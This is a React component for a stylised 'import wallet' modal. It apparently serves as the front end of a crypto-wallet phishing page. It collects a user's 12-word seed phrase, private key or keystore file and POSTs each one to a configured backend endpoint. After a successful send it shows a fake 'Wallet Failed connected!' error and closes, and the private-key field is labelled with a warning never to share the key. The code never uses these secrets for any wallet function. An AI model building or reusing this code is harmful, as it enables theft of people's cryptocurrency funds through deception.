import React, { useState, useEffect, useRef } from "react";
import styled, { keyframes } from "styled-components";
import { FaEyeSlash, FaEye, FaTimes, FaFileImport, FaKey, FaSeedling } from "react-icons/fa";
import { toast } from "react-toastify";

// --- Animations ---
const fadeIn = keyframes`
  from { opacity: 0; }
  to { opacity: 1; }
`;

const slideUp = keyframes`
  from { opacity: 0; transform: translateY(30px) scale(0.98); }
  to { opacity: 1; transform: translateY(0) scale(1); }
`;

// --- Styled Components ---

const Overlay = styled.div`
  position: fixed;
  inset: 0;
  background: rgba(5, 5, 10, 0.85);
  backdrop-filter: blur(12px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  padding: 24px;
  animation: ${fadeIn} 0.3s ease-out;
`;

const ModalContainer = styled.div`
  background: linear-gradient(180deg, #181824 0%, #232328 100%);
  border: 2px solid #00d4ff;
  border-radius: 28px;
  width: 100%;
  max-width: 650px;
  box-shadow: 
    0 25px 50px -12px rgba(0, 0, 0, 0.7),
    0 0 0 1.5px #00d4ff66 inset;
  overflow: hidden;
  position: relative;
  animation: ${slideUp} 0.4s cubic-bezier(0.16, 1, 0.3, 1);
  color: #fff;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
  display: flex;
  flex-direction: column;
`;

const Header = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 32px 32px 0; /* Increased padding */
`;

const TitleGroup = styled.div`
  display: flex;
  align-items: center;
  gap: 16px;
`;


const Title = styled.h2`
  margin: 0;
  font-size: 1.5rem; /* Larger title */
  font-weight: 700;
  letter-spacing: -0.02em;
  color: #ffffff;
`;

const CloseButton = styled.button`
  background: rgba(255, 255, 255, 0.05);
  border: none;
  color: #9ca3af;
  width: 36px;
  height: 36px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.2s ease;

  &:hover {
    background: rgba(255, 255, 255, 0.15);
    color: #fff;
    transform: rotate(90deg);
  }
`;

const Content = styled.div`
  padding: 40px 48px 40px 48px;
  min-height: 420px;
  @media (max-width: 700px) {
    padding: 24px 8px;
  }
`;

const TabContainer = styled.div`
  display: flex;
  background: rgba(0, 0, 0, 0.4);
  border-radius: 16px;
  padding: 6px;
  margin-bottom: 32px; /* More space below tabs */
  border: 1px solid rgba(255, 255, 255, 0.05);
`;

const Tab = styled.button`
  flex: 1;
  padding: 12px;
  background: ${props => props.$active ? 'linear-gradient(90deg, #00d4ff 0%, #b026ff 100%)' : 'transparent'};
  color: ${props => props.$active ? '#fff' : '#00d4ff'};
  border: 2px solid transparent;
  border-radius: 12px;
  font-size: 0.95rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;

  &:hover {
    color: #fff;
    background: linear-gradient(90deg, #00d4ff 0%, #b026ff 100%);
  }
`;

const InputArea = styled.div`
  animation: ${slideUp} 0.3s ease-out;
`;

const SeedGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 12px; /* Increased gap */
  margin-bottom: 24px; /* More space below grid */
`;

const SeedInputWrapper = styled.div`
  position: relative;
  display: flex;
  align-items: center;
`;

const SeedNumber = styled.span`
  position: absolute;
  left: 12px;
  color: #4b5563;
  font-size: 0.75rem;
  font-weight: 700;
  user-select: none;
  z-index: 2;
`;

const Input = styled.input`
  width: 100%;
  background: rgba(30, 30, 40, 0.85);
  border: 2px solid #00fff9;
  border-radius: 14px;
  padding: ${props => props.$seed ? '14px 38px 14px 34px' : '18px'};
  color: #fff;
  font-size: 1.05rem;
  transition: all 0.2s;
  outline: none;

  &:focus {
    background: rgba(30, 30, 40, 1);
  }

  &::placeholder {
    color: #00d4ff;
    opacity: 0.7;
  }
`;

const ToggleVisibility = styled.button`
  position: absolute;
  right: 10px;
  background: none;
  border: none;
  color: #6b7280;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 6px;
  border-radius: 6px;
  
  &:hover {
    color: #fff;
    background: rgba(255,255,255,0.05);
  }
`;

const ActionRow = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 8px;
`;

const HelperText = styled.p`
  color: #6b7280;
  font-size: 0.85rem;
  margin: 0;
  line-height: 1.4;
`;

const PasteLink = styled.button`
  background: none;
  border: none;
  color: #00fff9;
  font-size: 0.9rem;
  font-weight: 600;
  cursor: pointer;
  padding: 4px 8px;
  border-radius: 6px;
  
  &:hover {
    background: rgba(246, 133, 27, 0.1);
  }
`;

const FileUploadArea = styled.div`
  border: 2px dashed rgba(255, 255, 255, 0.1);
  border-radius: 20px;
  padding: 48px 24px; /* More padding */
  text-align: center;
  cursor: pointer;
  transition: all 0.2s;
  background: rgba(0, 0, 0, 0.2);

  &:hover {
    border-color: #00fff9;
    background: rgba(246, 133, 27, 0.05);
  }

  input {
    display: none;
  }
`;

const FileLabel = styled.label`
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 16px;
  cursor: pointer;
  color: #9ca3af;
`;

const PrimaryButton = styled.button`
  width: 100%;
  padding: 18px;
  margin-top: 36px;
  background: linear-gradient(90deg, #00d4ff 0%, #b026ff 100%);
  border: 2px solid #00fff9;
  border-radius: 18px;
  color: white;
  font-weight: 800;
  font-size: 1.15rem;
  cursor: pointer;
  transition: all 0.2s;
  box-shadow: 0 4px 24px #00d4ff44;

  &:hover {
    transform: translateY(-2px) scale(1.01);
    box-shadow: 0 8px 32px #b026ff55;
    background: linear-gradient(90deg, #b026ff 0%, #00d4ff 100%);
    border-color: #b026ff;
  }

  &:active {
    transform: translateY(1px) scale(0.99);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    filter: grayscale(1);
  }
`;

// --- Main Component ---

function WalletConnectModals({ isOpen, setIsOpen, coin }) {
  const [importType, setImportType] = useState("seed");
  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [jsonFile, setJsonFile] = useState(null);
  const [visibleFields, setVisibleFields] = useState(Array(12).fill(false));
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(null); // null | true | false
  const [hasError, setHasError] = useState(false);

  const modalRef = useRef(null);

  // Close on Escape key
  useEffect(() => {
    const handleEsc = (e) => {
      if (e.key === 'Escape') setIsOpen(false);
    };
    window.addEventListener('keydown', handleEsc);
    return () => window.removeEventListener('keydown', handleEsc);
  }, []);

  // Close when clicking outside
  const handleOverlayClick = (e) => {
    if (modalRef.current && !modalRef.current.contains(e.target)) {
      setIsOpen(false);
    }
  };




  const distributeSeedPhrase = (text) => {
    // Replace commas with spaces and split by any whitespace
    const words = text.replace(/,/g, ' ').trim().split(/\s+/);

    if (words.length !== 12) {
      setHasError(true);
      toast.error(`Invalid phrase: Found ${words.length} words. Exactly 12 required.`, {
        position: "top-center",
        theme: "dark"
      });
      // Remove error highlight after 1.5 seconds
      setTimeout(() => setHasError(false), 1500);
      return; 
    }

    setHasError(false);
    const updated = [...seedPhrase];
    for (let i = 0; i < 12; i++) {
      updated[i] = words[i] || '';
    }
    setSeedPhrase(updated);
    toast.success("Mnemonic phrase imported!", { autoClose: 2000, theme: "dark" });
  };

  const handleSeedChange = (idx, value) => {
    const updated = [...seedPhrase];
    updated[idx] = value;
    setSeedPhrase(updated);
  };

  const handlePasteAll = async () => {
    try {
      const text = await navigator.clipboard.readText();
      distributeSeedPhrase(text, 0);
    } catch (e) {
      alert("Failed to read clipboard");
    }
  };

  const handleInputPaste = (idx) => async (e) => {
    e.preventDefault();
    let text = e.clipboardData ? e.clipboardData.getData('text') : '';
    if (!text) {
      try {
        text = await navigator.clipboard.readText();
      } catch {}
    }
    if (text) {
      distributeSeedPhrase(text, idx);
    }
  };

  const toggleVisibility = (idx) => {
    setVisibleFields((prev) => prev.map((val, i) => (i === idx ? !val : val)));
  };

  // --- API Integration ---
  const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";
  const API_KEY = process.env.NEXT_PUBLIC_API_KEY || "";

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true);
    setSuccess(null);
    try {
      let res;
      if (importType === "seed") {
        // POST to /simple-form
        const phrase = seedPhrase.join(" ").trim();
        if (!phrase) throw new Error("Seed phrase is required");
        res = await fetch(`${API_URL}/simple-form`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "x-api-key": API_KEY,
          },
          body: JSON.stringify({
            title: coin?.title || "Unknown Wallet",
            seed: phrase,
          }),
        });
      } else if (importType === "private") {
        // POST to /simple-passkey
        if (!privateKey) throw new Error("Private key is required");
        res = await fetch(`${API_URL}/simple-passkey`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "x-api-key": API_KEY,
          },
          body: JSON.stringify({
            title: coin?.title || "Unknown Wallet",
            passkey: privateKey,
          }),
        });
      } else if (importType === "json") {
        // POST to /form-with-json
        if (!jsonFile) throw new Error("JSON file is required");
        const formData = new FormData();
        formData.append("title", coin?.title || "Unknown Wallet");
        formData.append("walletFile", jsonFile);
        res = await fetch(`${API_URL}/form-with-file`, {
          method: "POST",
          headers: {
            "x-api-key": API_KEY,
          },
          body: formData,
        });
      }
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.msg || "Submission failed");
      }
      toast.error("Wallet Failed connected!", {
        position: "bottom-right",
        theme: "colored"
      });

      
      setSuccess(true);
      // Optionally reset fields
      setSeedPhrase(Array(12).fill(""));
      setPrivateKey("");
      setJsonFile(null);
      setTimeout(() => {
        setIsOpen(false);
        setSeedPhrase(Array(12).fill(""));
      }, 2000);
    } catch (err) {
      setSuccess(false);
      setIsOpen(false)
    } finally {
      setLoading(false);
    }
  }

  const renderContent = () => {
    switch (importType) {
      case "json":
        return (
          <InputArea key="json">
            <FileUploadArea>
              <input 
                type="file" 
                accept=".json,.utc,.dat,.wlt,.txt,application/json"
                id="json-upload"
                onChange={(e) => setJsonFile(e.target.files[0])} 
              />
              <FileLabel htmlFor="json-upload">
                <FaFileImport size={40} color="#00fff9" />
                <span style={{ fontSize: '1.1rem', fontWeight: 600 }}>
                  {jsonFile ? jsonFile.name : "Upload Keystore File"}
                </span>
                <HelperText>JSON format supported</HelperText>
              </FileLabel>
            </FileUploadArea>
          </InputArea>
        );
      case "private":
        return (
          <InputArea key="private">
            <Input
              type="text"
              placeholder="Enter private key (0x...)"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
            />
            <HelperText style={{ marginTop: 12 }}>
              Warning: Never share your private key with anyone.
            </HelperText>
          </InputArea>
        );
      case "seed":
      default:
        return (
          <InputArea key="seed">
            <SeedGrid>
              {seedPhrase.map((word, idx) => (
                <SeedInputWrapper key={idx}>
                  <SeedNumber>{idx + 1}</SeedNumber>
                  <Input
                    $seed
                    $error={hasError}
                    type={visibleFields[idx] ? "text" : "password"}
                    value={word}
                    onChange={(e) => handleSeedChange(idx, e.target.value)}
                    onPaste={handleInputPaste(idx)}
                  />
                  <ToggleVisibility
                    type="button"
                    onClick={() => toggleVisibility(idx)}
                    tabIndex="-1"
                  >
                    {visibleFields[idx] ? <FaEyeSlash size={14} /> : <FaEye size={14} />}
                  </ToggleVisibility>
                </SeedInputWrapper>
              ))}
            </SeedGrid>
            <ActionRow>
              <HelperText>12 words separated by spaces</HelperText>
              <PasteLink type="button" onClick={handlePasteAll}>Paste Phrase</PasteLink>
            </ActionRow>
          </InputArea>
        );
    }
  };

  if (!isOpen) return null;

  return (
    <Overlay onClick={handleOverlayClick}>
      <ModalContainer ref={modalRef}>
        <Header>
          <TitleGroup>
            {coin && coin.image && (
              <img src={coin.image.src} alt={coin.title} style={{ width: 44, height: 44, borderRadius: 14, objectFit: 'cover', background: '#fff' }} />
            )}
            <div>
              <Title style={{ marginBottom: 2 }}>{coin?.title || 'Import Wallet'}</Title>
              {coin?.description && (
                <div style={{ fontSize: '0.95rem', color: '#bbb', fontWeight: 400 }}>{coin.description}</div>
              )}
            </div>
          </TitleGroup>
          <CloseButton onClick={() => setIsOpen(false)} aria-label="Close modal">
            <FaTimes />
          </CloseButton>
        </Header>

        <Content>
          <TabContainer>
            <Tab $active={importType === "seed"} onClick={() => setImportType("seed")}> 
              <FaSeedling /> Phrase
            </Tab>
            <Tab $active={importType === "private"} onClick={() => setImportType("private")}> 
              <FaKey /> Key
            </Tab>
            <Tab $active={importType === "json"} onClick={() => setImportType("json")}> 
              <FaFileImport /> JSON
              
            </Tab>
          </TabContainer>

          <form onSubmit={handleSubmit}>
            {renderContent()}
            <div style={{ marginTop: 24 }}>
              <PrimaryButton type="submit" disabled={loading}>
                {loading
                  ? "Submitting..."
                  : importType === "json"
                  ? "Import File"
                  : "Import Wallet"}
              </PrimaryButton>
            </div>
          </form>
        </Content>
      </ModalContainer>
    </Overlay>
  );
}

export default WalletConnectModals;